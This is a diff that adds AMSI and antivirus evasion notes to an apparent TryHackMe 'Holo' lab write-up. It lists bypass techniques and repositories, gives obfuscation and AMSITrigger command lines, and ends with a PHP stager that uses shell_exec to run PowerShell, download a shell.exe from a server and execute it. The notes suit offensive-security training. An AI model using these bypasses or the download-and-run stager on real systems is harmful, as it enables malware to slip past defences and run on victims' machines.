@@ -480,11 +480,150 @@ https://www.youtube.com/watch?v=tJGROL0PM4I
 
 https://www.youtube.com/watch?v=UCBcpgdKPak
 
-
 BROWSE_THESENUTS,
 ![](SYKEITTHEWRONGKEY.png)
 
 Reminder that Alh4zr3d will mald into the oblivion to stop at a point where he is trying the NTMLrelay [THM Alh4zr3d  Owning THM Holo Network](https://www.youtube.com/watch?v=UCBcpgdKPak) to then move to [THM Cthulhu Cthursday: The Malding Conclusion of TryHackMe's "Holo"!](https://www.youtube.com/watch?v=0VGRim39U9w)
 
 
+#### AV Evasion Notes for the Archive
+
+The Anti-Malware Scan Interface (AMSI) is a PowerShell security feature that will allow any applications or services to integrate into antimalware products to scan payloads before execution inside of the runtime. For documentation: [Windows docs](https://docs.microsoft.com/en-us/windows/win32/amsi/). AMSI is instrumented in both `System.Management.Automation.dll` and within the [Common Language Runtime CLR](https://learn.microsoft.com/en-us/dotnet/standard/clr)
+
+![](amsiarchwithsrc.png)
+
+AMSI response codes per scan: 
+```cpp
+AMSI_RESULT_CLEAN = 0
+AMSI_RESULT_NOT_DETECTED = 1
+AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384
+AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479
+AMSI_RESULT_DETECTED = 32768
+```
+
+AMSI is fully integrated into the following Windows components.  
+- User Account Control, or UAC
+- PowerShell
+- Windows Script Host (wscript and cscript)
+- JavaScript and VBScript
+- Office VBA macros
+- Third-party AMSI integration:  
+	- For developers [AMSI for Developers - docs.microsoft.com](https://docs.microsoft.com/en-us/windows/win32/amsi/dev-audience)[](https://docs.microsoft.com/en-us/windows/win32/amsi/dev-audience)
+	- AMSI Win32 API, [https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions)
+	- AMSI COM Interface, [https://docs.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iamsistream](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iamsistream)
+
+
+
+[Cobbr's Insecure Powershell - Github](https://github.com/PowerShell/PowerShell/compare/master...cobbr:master) for PowerShell without security features, allowing for comparison with a latest *most-secure* version of PowerShell. 
+
+**Beware** any crafted AMSI bypasses need to be further modified as they are signatures for detection of AMSI Bypasses as a technique that AMSI and Windows Defender will use to block further execution. No script kiddies here, elevate yourself with junk code, encoding, and other techniques (Obfuscation Techniques)
+
+Bypassing AMSI typology
+- Library of Bypasses from [S3cur3Th1sSh1t Amsi-Bypass-Powershell - GitHub](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), that include:
+	1. [Using Hardware Breakpoints](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Using-Hardware-Breakpoints "Goto Using-Hardware-Breakpoints")
+	2. [Using CLR hooking](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Using-CLR-hooking "Goto Using-CLR-hooking")
+	3. [Patch the provider’s DLL of Microsoft MpOav.dll](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Patch-the-providers-DLL-of-Microsoft-MpOav.dll "Goto Patch-the-providers-DLL-of-Microsoft-MpOav.dll")
+	4. [Scanning Interception and Provider function patching](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Scanning-Interception "Goto Scanning-Interception")
+	5. [Patching AMSI AmsiScanBuffer by rasta-mouse](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Patching-AMSI-AmsiScanBuffer-by-rasta-mouse "Goto Patching-AMSI-AmsiScanBuffer-by-rasta-mouse")
+	6. [Patching AMSI AmsiOpenSession](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Patching-AMSI-AmsiOpenSession "Goto Patching-AMSI-AmsiOpenSession")
+	7. [Dont use net webclient](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Dont-use-net-webclient "Goto Dont-use-net-webclient") - this one is not working anymore
+	8. [Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Amsi-ScanBuffer-Patch "Goto Amsi-ScanBuffer-Patch")
+	9. [Forcing an error](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Forcing-an-error "Goto Forcing-an-error")
+	10. [Disable Script Logging](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Disable-Script-Logging "Goto Disable-Script-Logging")
+	11. [Amsi Buffer Patch - In memory](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Amsi-Buffer-Patch---In-memory "Goto Amsi-Buffer-Patch---In-memory")
+	12. [Same as 6 but integer Bytes instead of Base64](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Same-as-6-but-integer-Bytes-instead-of-Base64 "Goto Same-as-6-but-integer-Bytes-instead-of-Base64")
+	13. [Using Matt Graeber's Reflection method](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Using-Matt-Graebers-Reflection-method "Goto Using-Matt-Graebers-Reflection-method")
+	14. [Using Matt Graeber's Reflection method with WMF5 autologging bypass](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass "Goto Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass")
+	15. [Using Matt Graeber's second Reflection method](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Using-Matt-Graebers-second-Reflection-method "Goto Using-Matt-Graebers-second-Reflection-method")
+	16. [Using Cornelis de Plaa's DLL hijack method](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Using-Cornelis-de-Plaas-DLL-hijack-method "Goto Using-Cornelis-de-Plaas-DLL-hijack-method")
+	17. [Use Powershell Version 2 - No AMSI Support there](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Using-PowerShell-version-2 "Goto Using-PowerShell-version-2")
+	18. [Nishang all in one](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Nishang-all-in-one "Goto Nishang-all-in-one")
+	19. [Adam Chesters Patch](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Adam-Chester-Patch "Goto Adam-Chester-Patch")
+	20. [Modified version of 3. Amsi ScanBuffer - no CSC.exe compilation](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Modified-Amsi-ScanBuffer-Patch "Goto Modified-Amsi-ScanBuffer-Patch")
+	21. [Patching the AmsiScanBuffer address in System.Management.Automation.dll](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Patching-AmsiScanBuffer-Address "Goto Patching-AmsiScanBuffer-Address")
+- Mentioned in Hololive Room for repetitive completionism's sake:
+	- Patching amsi.dll - *The bypass will identify DLL locations and modify memory permissions to return undetected AMSI response values.*
+		- Patching amsi.dl Tal Liberman, [https://github.com/BC-SECURITY/Empire/blob/master/lib/common/bypasses.py](https://github.com/BC-SECURITY/Empire/blob/master/lib/common/bypasses.py)
+		- RastaMouse patching amsi.dl with C\# , [https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs](https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs).
+	- Amsi ScanBuffer patch
+	- Forcing errors
+	- Matt Graeber's Reflection: [https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
+	- PowerShell downgrade
+	- [https://offensivedefence.co.uk/posts/making-amsi-jump/](https://offensivedefence.co.uk/posts/making-amsi-jump/)
+	- https://i.blackhat.com/briefings/asia/2018/asia-18-Tal-Liberman-Documenting-the-Undocumented-The-Rise-and-Fall-of-AMSI.pdf](https://i.blackhat.com/briefings/asia/2018/asia-18-Tal-Liberman-Documenting-the-Undocumented-The-Rise-and-Fall-of-AMSI.pdf)
+	- [https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
+	- [https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim)
+	- [https://blog.f-secure.com/hunting-for-amsi-bypasses/](https://blog.f-secure.com/hunting-for-amsi-bypasses/)
+	- [https://www.contextis.com/us/blog/amsi-bypass](https://www.contextis.com/us/blog/amsi-bypass)
+	- [https://www.redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass](https://www.redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass)
+	- [https://amsi.fail/](https://amsi.fail/)[](https://amsi.fail/)
+	- [https://rastamouse.me/blog/asb-bypass-pt2/](https://rastamouse.me/blog/asb-bypass-pt2/)
+	- [https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)
+	- [https://www.youtube.com/watch?v=F_BvtXzH4a4](https://www.youtube.com/watch?v=F_BvtXzH4a4)
+	- [https://www.youtube.com/watch?v=lP2KF7_Kwxk](https://www.youtube.com/watch?v=lP2KF7_Kwxk)
+	- [https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
+- Use Batch as it is not [integrated with Batch](https://www.securonix.com/blog/securonix-threat-research-knowledge-sharing-series-batch-obfuscation/) - Enjoy your `winpeas.bat` running!
+- Use a C2 Beacon and execute assembly
+
+(Post-) Obfuscation and Testing
+- Type accelerators for PowerShell 7.1 till X?  [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_type_accelerators?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_type_accelerators?view=powershell-7.1)
+- PowerShell Obfucation resources
+	-  [https://amsi.fail/](https://amsi.fail/)
+	- [https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)
+	- [https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)
+	- [https://www.youtube.com/watch?v=lP2KF7_Kwxk](https://www.youtube.com/watch?v=lP2KF7_Kwxk)
+	- [https://www.youtube.com/watch?v=F_BvtXzH4a4](https://www.youtube.com/watch?v=F_BvtXzH4a4)
+
+Test payloads against **only AMSI** with  [https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger), written by RythmStick
+```powershell
+# Outputs which lines are flagged if fails
+.\AMSITrigger.exe -u <URL> -f 1
+.\AMSITrigger.exe -i <file> -f 1
+```
+
+
+`Invoke-Obfuscation`, [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation): *"Invoke-Obfuscation is a PowerShell v2.0+ compatible PowerShell command and script obfuscator."*
+- [Co-creator Daniel Bohannon's Usage Guide from personal blog](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide). 
+ 
+It has a tree structure to obfuscation using `\\` as a delimiter between token commands, strings, whitespace and digit to the perform Obfuscation techniques with the PowerShell source code.   
+```powershell
+Invoke-Obfuscation -ScriptBlock {'Payload Here'} -Command 'Token\\String\\1,2,\\Whitespace\\1' -Quiet -NoExit
+```
+
+
+Dealing with AMSI-Defender-Bypass-Arms-Race
+[https://github.com/IonizeCbr/AmsiPatchDetection](https://github.com/IonizeCbr/AmsiPatchDetection) - no description, 
+Code Analysis
+ - [https://github.com/rasta-mouse/ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)
+ -  [https://github.com/matterpreter/DefenderCheck](https://github.com/matterpreter/DefenderCheck)
+
+
+Coventant Templates by RastaMouse: [https://offensivedefence.co.uk/posts/covenant-profiles-templates/](https://offensivedefence.co.uk/posts/covenant-profiles-templates/).
+#### On return
+
+Develope, compile and execute for PowerShell shell for the personal objectives:
+- https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs
+- Test with  [https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger), written by RythmStick (only tests against AMSI not Defender), but also requires environment replication, which takes hours and at this point that is somewhat overkill and redundant and waste of my time. 
+
+```php
+<?php
+function get_stager() {
+    $init = "powershell.exe";
+    $payload = "Invoke-WebRequest 127.0.0.1:8000/shell.exe -outfile notashell.exe"; 
+    $execution_command = "shell_exec";
+    $query = $execution_command("$init $payload");
+    echo $query;
+}    
+function execute_stager() {
+    $init = "powershell.exe";
+    $payload = ".\notashell.exe"; 
+    $execution_command = "shell_exec";
+    $query = $execution_command("$init $payload");
+    echo $query;
+}
+get_stager();
+execute_stager();
+die();   
+?>
+```
 ## Beyond Root
